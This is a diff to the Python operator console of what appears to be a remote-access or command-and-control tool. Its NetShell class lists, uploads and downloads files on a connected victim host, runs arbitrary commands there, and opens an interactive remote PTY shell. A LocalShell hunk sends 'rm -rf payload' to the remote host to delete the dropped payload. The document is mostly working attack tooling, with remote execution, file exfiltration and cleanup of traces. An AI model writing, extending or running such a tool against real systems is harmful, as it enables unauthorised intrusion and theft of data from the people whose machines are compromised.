@@ -10,6 +10,7 @@ from threading import Thread
 
 import logging
 import signal
+import pickle
 import rich
 import json
 import time
@@ -41,7 +42,7 @@ class NetShell(cmd.Cmd):
         self.id = None
         self.output = None
         self.shell_active = True
-        Thread(target=self.is_alive).start()
+        # Thread(target=self.is_alive).start()
 
     def default(self, line):
         local_shell(line)
@@ -117,9 +118,10 @@ class NetShell(cmd.Cmd):
         <--Commands start here-->
     """
 
-    def do_ls(self, line):
+    def do_ls(self, line): # Crash on stderr
         try:
-            is_err, _data = self.socket.send_command(f"ls {line}")
+            arr = f"ls {line}".split(" ")
+            is_err, _data = self.socket.send_command(arr)
             data = pretty(_data)
             if is_err:
                 sys.stdout.write(f"{data}\n")
@@ -127,40 +129,48 @@ class NetShell(cmd.Cmd):
                 console.print(ls(json.loads(data)))
         except BrokenPipeError:
             self.do_exit("")
-
-    def do_put(self, line):
-        filename = line.split("/")[-1]
-        check = self.socket.send_command(f"put_file {filename}")
-        time.sleep(2)
-        if b"ready" in check:
-            with open(line, "r") as f:
-                self.socket.send_msg(f.read())
-
-    def do_get(self, line):
-        is_err, _data = self.socket.send_command(f"get_file {line}")
-        data = pretty(_data)
-        if not is_err:
-            with open(line.split("/")[-1], "w") as f:
-                f.write(f"{data}\n")
-        else:
-            sys.stdout.write(f"{data}\n")
-
-    def do_run(self, line):
-        is_err, _data = self.socket.send_command(f"cmd {line}")
-        data = pretty(_data)
-        if data:
-            sys.stdout.write(f"{data}\n")
-
-    def do_shell(self, line):
-        self.socket.send_command(f"shell")
-        RawShell(self.socket, pty=True).run()
-        return
     
     def do_cd(self, line):
-        is_err, _data = self.socket.send_command(f"cd {line}")
+        arr = f"cd {line}".split(" ")
+        is_err, _data = self.socket.send_command(arr)
         data = pretty(_data)
         if data:
             sys.stdout.write(f"{data}\n")
+
+    def do_put(self, line): # TODO Does not have error handling
+        if not os.path.exists(line):
+            sys.stdout.write(f"File '{line}' does not exist.\n")
+            return
+        
+        with open(line, "rb") as f:
+            arr = f"put_file {line}".split(" ")
+            arr.append(f.read())
+
+        is_err, _data = self.socket.send_command(arr)
+        if is_err:
+            sys.stdout.write(f"{pretty(_data)}\n")
+
+    def do_get(self, line):
+        arr = f"get_file {line}".split(" ")
+        is_err, _data = self.socket.send_command(arr)
+        if not is_err:
+            _data
+            with open(line.split("/")[-1], "wb") as f:
+                f.write(_data)
+        else:
+            sys.stdout.write(f"{pretty(_data)}\n")
+
+    def do_run(self, line):
+        arr = f"cmd {line}".split(" ")
+        is_err, _data = self.socket.send_command(arr)
+        data = pretty(_data)
+        if data:
+            sys.stdout.write(f"{data}")
+
+    def do_shell(self, line):
+        self.socket.send_command(["shell"])
+        RawShell(self.socket, pty=True).run()
+        return
 
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
@@ -317,7 +327,7 @@ class LocalShell(cmd.Cmd):
                     return
 
                 if not sock: return
-                sock.send_command("cmd rm -rf payload")
+                sock.send_command("cmd rm -rf payload".split(" "))
                 self.current_session = NetShell(sock)
                 self.current_session.session_type = "python"
             except Exception as e:
